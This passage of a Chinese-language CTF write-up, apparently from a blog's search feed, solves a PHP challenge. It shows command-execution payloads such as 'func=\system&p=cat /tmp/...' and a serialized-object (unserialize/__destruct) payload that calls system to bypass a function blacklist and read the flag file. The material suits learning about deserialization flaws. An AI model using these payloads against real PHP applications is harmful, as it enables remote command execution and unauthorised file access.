alt="image"><br>读最底下这个<code>/tmp/flagoefiu4r93</code>：<br><code>func=file_get_contents&amp;p=/tmp/flagoefiu4r93</code><br>或者<code>func=\system&amp;p=cat /tmp/flagoefiu4r93</code><br>得flag<br>第二种方法用了反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p); <span class="hljs-comment">//命令执行</span><br>            &#125;<br>        &#125;<br><span class="hljs-comment">//这东西没被用过，因为Test类里包含一个__destruct函数，这函数在对象被销毁时会被调用，</span><br></code></pre></td></tr></table></figure><p>我们想执行system(‘ls’)而且要绕过对func的黑名单检测，可以先序列化要执行的命令，然后利用get函数反序列化要执行的命令，反序列化后要销毁变量时会调用__destruct函数，这个函数定义了func(要执行的命令)和p(要执行命令的参数)，然后再调用一次gettime函数(又执行了一次命令)。一来一回执行了两次gettime。<br>先序列化我们要执行的命令和参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>       <br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//结果：O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>payload:<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;// 看当前目录下有什么文件</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121505457-2065669123.png" alt="image"><br>OK，没啥问题，因为根据第一种做法已经知道了flag藏在哪，直接去找<code>/tmp/flagoefiu4r93</code>把我们的命令序列化一下：<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code><br>结果：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121727159-1447658532.png" alt="image"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
